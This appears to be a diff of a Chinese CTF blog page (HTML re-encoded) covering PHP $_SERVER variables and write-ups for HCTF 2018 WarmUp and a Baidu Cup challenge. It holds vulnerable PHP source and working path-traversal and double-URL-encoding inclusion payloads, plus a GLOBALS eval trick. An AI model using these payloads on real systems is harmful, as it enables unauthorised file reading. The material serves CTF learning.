 <tr>
-<td>$_SERVER[‘QUERY_STRING’]</td>
-<td>返回查询字符串，如果是通过查询字符串访问此页面。</td>
+<td>$_SERVER[&#x2018;QUERY_STRING&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x67E5;&#x8BE2;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x901A;&#x8FC7;&#x67E5;&#x8BE2;&#x5B57;&#x7B26;&#x4E32;&#x8BBF;&#x95EE;&#x6B64;&#x9875;&#x9762;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘HTTP_ACCEPT’]</td>
-<td>返回来自当前请求的请求头。</td>
+<td>$_SERVER[&#x2018;HTTP_ACCEPT&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x6765;&#x81EA;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td>
-<td>返回来自当前请求的 Accept_Charset 头（ 例如 utf-8,ISO-8859-1）</td>
+<td>$_SERVER[&#x2018;HTTP_ACCEPT_CHARSET&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x6765;&#x81EA;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684; Accept_Charset &#x5934;&#xFF08; &#x4F8B;&#x5982; utf-8,ISO-8859-1&#xFF09;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘HTTP_HOST’]</td>
-<td>返回来自当前请求的 Host 头。</td>
+<td>$_SERVER[&#x2018;HTTP_HOST&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x6765;&#x81EA;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684; Host &#x5934;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘HTTP_REFERER’]</td>
-<td>返回当前页面的完整 URL（不可靠，因为不是所有用户代理都支持）。</td>
+<td>$_SERVER[&#x2018;HTTP_REFERER&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x9875;&#x9762;&#x7684;&#x5B8C;&#x6574; URL&#xFF08;&#x4E0D;&#x53EF;&#x9760;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7528;&#x6237;&#x4EE3;&#x7406;&#x90FD;&#x652F;&#x6301;&#xFF09;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘HTTPS’]</td>
-<td>是否通过安全 HTTP 协议查询脚本。</td>
+<td>$_SERVER[&#x2018;HTTPS&#x2019;]</td>
+<td>&#x662F;&#x5426;&#x901A;&#x8FC7;&#x5B89;&#x5168; HTTP &#x534F;&#x8BAE;&#x67E5;&#x8BE2;&#x811A;&#x672C;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘REMOTE_ADDR’]</td>
-<td>返回浏览当前页面的用户的 IP 地址。</td>
+<td>$_SERVER[&#x2018;REMOTE_ADDR&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x6D4F;&#x89C8;&#x5F53;&#x524D;&#x9875;&#x9762;&#x7684;&#x7528;&#x6237;&#x7684; IP &#x5730;&#x5740;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘REMOTE_HOST’]</td>
-<td>返回浏览当前页面的用户的主机名。</td>
+<td>$_SERVER[&#x2018;REMOTE_HOST&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x6D4F;&#x89C8;&#x5F53;&#x524D;&#x9875;&#x9762;&#x7684;&#x7528;&#x6237;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘REMOTE_PORT’]</td>
-<td>返回用户机器上连接到 Web 服务器所使用的端口号。</td>
+<td>$_SERVER[&#x2018;REMOTE_PORT&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x673A;&#x5668;&#x4E0A;&#x8FDE;&#x63A5;&#x5230; Web &#x670D;&#x52A1;&#x5668;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SCRIPT_FILENAME’]</td>
-<td>返回当前执行脚本的绝对路径。</td>
+<td>$_SERVER[&#x2018;SCRIPT_FILENAME&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SERVER_ADMIN’]</td>
-<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。</td>
+<td>$_SERVER[&#x2018;SERVER_ADMIN&#x2019;]</td>
+<td>&#x8BE5;&#x503C;&#x6307;&#x660E;&#x4E86; Apache &#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684; SERVER_ADMIN &#x53C2;&#x6570;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SERVER_PORT’]</td>
-<td>Web 服务器使用的端口。默认值为 “80”。</td>
+<td>$_SERVER[&#x2018;SERVER_PORT&#x2019;]</td>
+<td>Web &#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x7AEF;&#x53E3;&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A; &#x201C;80&#x201D;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SERVER_SIGNATURE’]</td>
-<td>返回服务器版本和虚拟主机名。</td>
+<td>$_SERVER[&#x2018;SERVER_SIGNATURE&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x670D;&#x52A1;&#x5668;&#x7248;&#x672C;&#x548C;&#x865A;&#x62DF;&#x4E3B;&#x673A;&#x540D;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘PATH_TRANSLATED’]</td>
-<td>当前脚本所在文件系统（非文档根目录）的基本路径。</td>
+<td>$_SERVER[&#x2018;PATH_TRANSLATED&#x2019;]</td>
+<td>&#x5F53;&#x524D;&#x811A;&#x672C;&#x6240;&#x5728;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x975E;&#x6587;&#x6863;&#x6839;&#x76EE;&#x5F55;&#xFF09;&#x7684;&#x57FA;&#x672C;&#x8DEF;&#x5F84;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SCRIPT_NAME’]</td>
-<td>返回当前脚本的路径。</td>
+<td>$_SERVER[&#x2018;SCRIPT_NAME&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x811A;&#x672C;&#x7684;&#x8DEF;&#x5F84;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SCRIPT_URI’]</td>
-<td>返回当前页面的 URI。</td>
+<td>$_SERVER[&#x2018;SCRIPT_URI&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x9875;&#x9762;&#x7684; URI&#x3002;</td>
 </tr>
 </tbody></table>
-<h4 id="PHP中preg-match正则匹配的-u-i-s是什么意思"><a href="#PHP中preg-match正则匹配的-u-i-s是什么意思" class="headerlink" title="PHP中preg_match正则匹配的/u /i  /s是什么意思"></a>PHP中preg_match正则匹配的/u /i  /s是什么意思</h4><p>/u 表示按unicode(utf-8)匹配（主要针对多字节比如汉字）<br>/i 表示不区分大小写（如果表达式里面有 a， 那么 A 也是匹配对象）<br>/s 表示将字符串视为单行来匹配</p>
-<h4 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h4><p>Orz啥都不说了，先膜两张图<br><img src="21.png"><br><img src="22.png"><br>上图中能发现两个特性，一个是win10真的金贵，一个就是<code>demo?/../flag.txt</code>能直接包含到flag.txt这是为啥呢</p>
+<h4 id="PHP&#x4E2D;preg-match&#x6B63;&#x5219;&#x5339;&#x914D;&#x7684;-u-i-s&#x662F;&#x4EC0;&#x4E48;&#x610F;&#x601D;"><a href="#PHP&#x4E2D;preg-match&#x6B63;&#x5219;&#x5339;&#x914D;&#x7684;-u-i-s&#x662F;&#x4EC0;&#x4E48;&#x610F;&#x601D;" class="headerlink" title="PHP&#x4E2D;preg_match&#x6B63;&#x5219;&#x5339;&#x914D;&#x7684;/u /i  /s&#x662F;&#x4EC0;&#x4E48;&#x610F;&#x601D;"></a>PHP&#x4E2D;preg_match&#x6B63;&#x5219;&#x5339;&#x914D;&#x7684;/u /i  /s&#x662F;&#x4EC0;&#x4E48;&#x610F;&#x601D;</h4><p>/u &#x8868;&#x793A;&#x6309;unicode(utf-8)&#x5339;&#x914D;&#xFF08;&#x4E3B;&#x8981;&#x9488;&#x5BF9;&#x591A;&#x5B57;&#x8282;&#x6BD4;&#x5982;&#x6C49;&#x5B57;&#xFF09;<br>/i &#x8868;&#x793A;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF08;&#x5982;&#x679C;&#x8868;&#x8FBE;&#x5F0F;&#x91CC;&#x9762;&#x6709; a&#xFF0C; &#x90A3;&#x4E48; A &#x4E5F;&#x662F;&#x5339;&#x914D;&#x5BF9;&#x8C61;&#xFF09;<br>/s &#x8868;&#x793A;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x89C6;&#x4E3A;&#x5355;&#x884C;&#x6765;&#x5339;&#x914D;</p>
+<h4 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h4><p>Orz&#x5565;&#x90FD;&#x4E0D;&#x8BF4;&#x4E86;&#xFF0C;&#x5148;&#x819C;&#x4E24;&#x5F20;&#x56FE;<br><img src="21.png"><br><img src="22.png"><br>&#x4E0A;&#x56FE;&#x4E2D;&#x80FD;&#x53D1;&#x73B0;&#x4E24;&#x4E2A;&#x7279;&#x6027;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;win10&#x771F;&#x7684;&#x91D1;&#x8D35;&#xFF0C;&#x4E00;&#x4E2A;&#x5C31;&#x662F;<code>demo?/../flag.txt</code>&#x80FD;&#x76F4;&#x63A5;&#x5305;&#x542B;&#x5230;flag.txt&#x8FD9;&#x662F;&#x4E3A;&#x5565;&#x5462;</p>
 <!--more-->
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理是demo?&#x2F;被当作目录，之后上跳目录就好了（这个只适用于linux）</span><br></pre></td></tr></table></figure>
-<p>OrZ<br>然后这个审计的题目</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>利用方法其实有两种，第一种是通过url两次编码的问题然后</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">整体的思路就是第一段不出现?，第二段又要出现?。</span><br><span class="line">所以进行二次urlencode编码， %253f</span><br><span class="line">浏览器会自动解码一次变成%3f，再经过代码的urldecode()变成?。</span><br><span class="line">接下来就是文件包含了-但是感觉和直接读取一样的</span><br></pre></td></tr></table></figure>
-<p>paylaod=<code>file=source.php%253f/../../../../ffffllllaaaagggg</code><br>方法二就是用上面的那个漏洞,直接读取</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;source.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<h4 id="“百度杯”CTF比赛-2017-二月场爆破-1"><a href="#“百度杯”CTF比赛-2017-二月场爆破-1" class="headerlink" title="“百度杯”CTF比赛 2017 二月场爆破-1"></a>“百度杯”CTF比赛 2017 二月场爆破-1</h4><p>描述<code>flag就在某六位变量中。</code><br>题目的意思是flag.php中定义了一个flag字符串 我们传递hello如果为那个变量 那个$$a就能把flag丢出来</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\w*$/&#x27;</span>,<span class="variable">$a</span> ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;ERROR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x539F;&#x7406;&#x662F;demo?/&#x88AB;&#x5F53;&#x4F5C;&#x76EE;&#x5F55;&#xFF0C;&#x4E4B;&#x540E;&#x4E0A;&#x8DF3;&#x76EE;&#x5F55;&#x5C31;&#x597D;&#x4E86;&#xFF08;&#x8FD9;&#x4E2A;&#x53EA;&#x9002;&#x7528;&#x4E8E;linux&#xFF09;<br></code></pre></td></tr></tbody></table></figure>
+<p>OrZ<br>&#x7136;&#x540E;&#x8FD9;&#x4E2A;&#x5BA1;&#x8BA1;&#x7684;&#x9898;&#x76EE;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>{<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) {<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&apos;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            }<br><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            }<br><br>            <span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&apos;?&apos;</span>, <span class="hljs-string">&apos;?&apos;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            }<br><br>            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&apos;?&apos;</span>, <span class="hljs-string">&apos;?&apos;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            }<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&apos;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&apos;file&apos;</span>])<br>        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&apos;file&apos;</span>])<br>        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&apos;file&apos;</span>])<br>    ) {<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&apos;file&apos;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    }  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p>&#x5229;&#x7528;&#x65B9;&#x6CD5;&#x5176;&#x5B9E;&#x6709;&#x4E24;&#x79CD;&#xFF0C;&#x7B2C;&#x4E00;&#x79CD;&#x662F;&#x901A;&#x8FC7;url&#x4E24;&#x6B21;&#x7F16;&#x7801;&#x7684;&#x95EE;&#x9898;&#x7136;&#x540E;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x6574;&#x4F53;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x7B2C;&#x4E00;&#x6BB5;&#x4E0D;&#x51FA;&#x73B0;?&#xFF0C;&#x7B2C;&#x4E8C;&#x6BB5;&#x53C8;&#x8981;&#x51FA;&#x73B0;?&#x3002;<br>&#x6240;&#x4EE5;&#x8FDB;&#x884C;&#x4E8C;&#x6B21;urlencode&#x7F16;&#x7801;&#xFF0C; %253f<br>&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x81EA;&#x52A8;&#x89E3;&#x7801;&#x4E00;&#x6B21;&#x53D8;&#x6210;%3f&#xFF0C;&#x518D;&#x7ECF;&#x8FC7;&#x4EE3;&#x7801;&#x7684;urldecode()&#x53D8;&#x6210;?&#x3002;<br>&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x4E86;-&#x4F46;&#x662F;&#x611F;&#x89C9;&#x548C;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x4E00;&#x6837;&#x7684;<br></code></pre></td></tr></tbody></table></figure>
+<p>paylaod=<code>file=source.php%253f/../../../../ffffllllaaaagggg</code><br>&#x65B9;&#x6CD5;&#x4E8C;&#x5C31;&#x662F;&#x7528;&#x4E0A;&#x9762;&#x7684;&#x90A3;&#x4E2A;&#x6F0F;&#x6D1E;,&#x76F4;&#x63A5;&#x8BFB;&#x53D6;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">file=source.php?/../../../../../ffffllllaaaagggg<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B;-2017-&#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-1"><a href="#&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B;-2017-&#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-1" class="headerlink" title="&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B; 2017 &#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-1"></a>&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B; 2017 &#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-1</h4><p>&#x63CF;&#x8FF0;<code>flag&#x5C31;&#x5728;&#x67D0;&#x516D;&#x4F4D;&#x53D8;&#x91CF;&#x4E2D;&#x3002;</code><br>&#x9898;&#x76EE;&#x7684;&#x610F;&#x601D;&#x662F;flag.php&#x4E2D;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;flag&#x5B57;&#x7B26;&#x4E32; &#x6211;&#x4EEC;&#x4F20;&#x9012;hello&#x5982;&#x679C;&#x4E3A;&#x90A3;&#x4E2A;&#x53D8;&#x91CF; &#x90A3;&#x4E2A;$$a&#x5C31;&#x80FD;&#x628A;flag&#x4E22;&#x51FA;&#x6765;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&apos;hello&apos;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&apos;/^\w*$/&apos;</span>,<span class="hljs-variable">$a</span> )){<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;ERROR&apos;</span>);<br>}<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$a</span>);&quot;</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
 
-<p>爆破的话贼恶心，所以正确的姿势应该是 <code>hello=GLOBALS</code>,使用超全局变量GLOBALS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;138c4d7d85c04385b91b779047d5906d0a331ddc3728405a.changame.ichunqiu.com&#x2F;?hello&#x3D;GLOBALS</span><br><span class="line">得到</span><br><span class="line">[&quot;d3f0f8&quot;]&#x3D;&gt; string(42) &quot;flag&#123;bfed2cef-1a03-4337-9f55-b00ddbcc5f0a&#125;</span><br></pre></td></tr></table></figure>
+<p>&#x7206;&#x7834;&#x7684;&#x8BDD;&#x8D3C;&#x6076;&#x5FC3;&#xFF0C;&#x6240;&#x4EE5;&#x6B63;&#x786E;&#x7684;&#x59FF;&#x52BF;&#x5E94;&#x8BE5;&#x662F; <code>hello=GLOBALS</code>,&#x4F7F;&#x7528;&#x8D85;&#x5168;&#x5C40;&#x53D8;&#x91CF;GLOBALS</p>
